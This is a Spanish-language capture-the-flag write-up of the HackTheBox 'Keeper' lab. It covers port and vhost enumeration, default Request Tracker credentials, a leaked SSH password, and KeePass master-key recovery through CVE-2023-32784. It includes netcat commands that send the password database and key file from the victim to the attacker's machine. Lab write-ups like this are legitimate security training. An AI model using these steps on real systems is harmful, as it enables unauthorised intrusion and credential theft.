# Keeper - HackTheBox

**Fecha de resolución:** 8 de octubre de 2026

Máquina Linux, IP 10.129.229.41.

## Reconocimiento

Escaneo completo de puertos:

```
nmap --privileged -n -sS -p- --min-rate 5000 -oG allPorts 10.129.229.41
```

Solo dos puertos abiertos, 22 y 80. Escaneo de servicios sobre ambos:

```
nmap -p22,80 -sCV -oN targets 10.129.229.41
```

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

La web en el puerto 80 no tiene título ni contenido visible en la IP directa.

## Enumeración web

`whatweb` contra la IP no dio nada útil. Fuzzing de directorios contra la IP directa tampoco. Pasé a fuzzing de vhosts:

```
gobuster vhost -u http://keeper.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

Encontró `tickets.keeper.htb`. Añadido a `/etc/hosts` junto con `keeper.htb`, `whatweb` contra el vhost identifica la aplicación:

```
http://tickets.keeper.htb/ [200 OK] ... PasswordField[pass], Request-Tracker[4.4.4+dfsg-2ubuntu1], Title[Login] ...
```

Es un Request Tracker (RT) 4.4.4, el sistema de tickets de Best Practical. Fuzzing de directorios sobre el vhost y sobre `/rt` no aportó nada: todas las extensiones probadas (`.txt`, `.php`, `.bak`) devuelven código 200 y el mismo tamaño (95 bytes) para cualquier nombre, la página de error de RT responde así por defecto, así que son falsos positivos.

## Intento fallido: SQLi en RT (CVE-2013-3525)

```
searchsploit request tracker
```

Aparece un exploit para RT: inyección SQL en el parámetro `ShowPending` del endpoint `/Approvals/` (exploit-db 38459, CVE-2013-3525), afecta a RT 4.0.10. Capturé con Burp una petición real a `/rt/Approvals/` del vhost y la guardé en `request.txt` para probarla con sqlmap:

```
sqlmap -r request.txt -p ShowPending --dbms=mysql --batch
```

No detecta nada inyectable. Subí el nivel de agresividad:

```
sqlmap -r request.txt -p ShowPending --dbms=mysql --batch --level 5 --risk 3
```

Esta vez sqlmap marca el parámetro como inyectable por tiempo (`MySQL < 5.0.12 AND time-based blind (BENCHMARK)`) y más adelante como UNION-inyectable con 85 columnas. Antes de llegar ahí, la propia herramienta había avisado de que el contenido de la página no es estable, lo que suele indicar falso positivo en las pruebas basadas en tiempo o en comparación de contenido. Sumado a que la versión instalada (4.4.4) es muy posterior a la vulnerable (4.0.10), corté la detección en vez de perseguir ese resultado.

## Acceso al panel de RT

Sin más vías en el propio RT, probé las credenciales por defecto del proyecto, documentadas públicamente en su página de GitHub: `root` / `password`. Funcionan y dan acceso al panel de tickets.

Revisando los tickets apareció uno de incorporación de un nuevo usuario del sistema, `lnorgaard`, con contraseña inicial `Welcome2023!`.

## Usuario: lnorgaard

```
ssh lnorgaard@keeper.htb
```

Contraseña `Welcome2023!`. Dentro:

```
lnorgaard@keeper:~$ cat user.txt
lnorgaard@keeper:~$ sudo -l
[sudo] password for lnorgaard:
Sorry, try again.
```

La contraseña de RT no sirve para `sudo`, así que no hay escalada directa por ahí. En el home hay un `RT30000.zip`:

```
lnorgaard@keeper:~$ unzip RT30000.zip
  inflating: KeePassDumpFull.dmp
  extracting: passcodes.kdbx
```

Es el adjunto de un ticket de soporte sobre KeePass: un volcado de memoria del proceso `KeePass.exe` (242 MB) y una base de datos `passcodes.kdbx` cifrada.

## Recuperando la master key (CVE-2023-32784)

Probé herramientas de KeePass instaladas localmente en la máquina para abrir la base directamente ahí: `keepass2`, `keepassx`, `kpcli`, `keepassxc`. Ninguna está instalada y no hay permisos para instalarlas, así que había que extraer la contraseña maestra del volcado de memoria y abrir la base en otro sitio.

KeePass 2.x anterior a la corrección de CVE-2023-32784 deja restos de la contraseña maestra en memoria. Escribí el PoC público para esa CVE (`keepass_dump.py`) directamente con `vim` en la máquina, pegando el código fuente.

Al ejecutarlo:

```
python3 keepass_dump.py -f KeePassDumpFull.dmp --skip --debug --recover
```

Falla con un error de compatibilidad con la versión de Python instalada:

```
TypeError: to_bytes() missing required argument 'length' (pos 1)
```

El script llama a `c.to_bytes()` sin argumentos, lo cual dejó de ser válido en versiones recientes de Python. Lo parcheé en el propio archivo:

```
sed -i 's/c.to_bytes()/c.to_bytes(1, "big")/g' keepass_dump.py
```

Con el parche, la herramienta recupera casi todos los caracteres de la contraseña maestra comparando los candidatos encontrados en memoria contra texto en claro que sigue presente en el volcado, pero deja varias posiciones sin resolver (marcadas como vacías o `{UNKNOWN}`). Los fragmentos reconocibles encajan con palabras en danés (entre ellas "med"), lo que explica los huecos: corresponden a caracteres no ASCII (la `å` danesa) que el script no es capaz de extraer por comparación de bytes. Completé a mano los huecos restantes hasta dar con la contraseña maestra que abre la base.

## De la kdbx a la clave privada

Sin GUI en la máquina para KeePass, saqué `passcodes.kdbx` a mi equipo por netcat:

```
nc -lvp 4444 > passcodes.kdbx   # en mi máquina
nc 10.10.14.x 4444 < passcodes.kdbx   # en la máquina víctima
```

Intenté abrir KeeWeb directamente en la propia máquina (`firefox https://app.keeweb.info/`) pero no hay Firefox instalado ni acceso a internet desde ahí, así que abrí KeeWeb (`app.keeweb.info`) en mi navegador local y cargué la base con la contraseña maestra recuperada.

Dentro hay una entrada con una clave privada PuTTY adjunta. La saqué de la misma forma, por netcat, y la confirmé con `bat`:

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
...
```

La guardé como `pass.ppk`.

## Root

Convertí la clave de formato PuTTY a OpenSSH con `puttygen` (tras un par de intentos con parámetros incorrectos):

```
puttygen pass.ppk -O private-openssh -o rootkey
chmod 600 rootkey
ssh -i rootkey root@keeper.htb
```

Acceso directo como root, sin passphrase:

```
root@keeper:~# whoami
root
root@keeper:~# cat root.txt
```

---

- GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
- TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
- HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
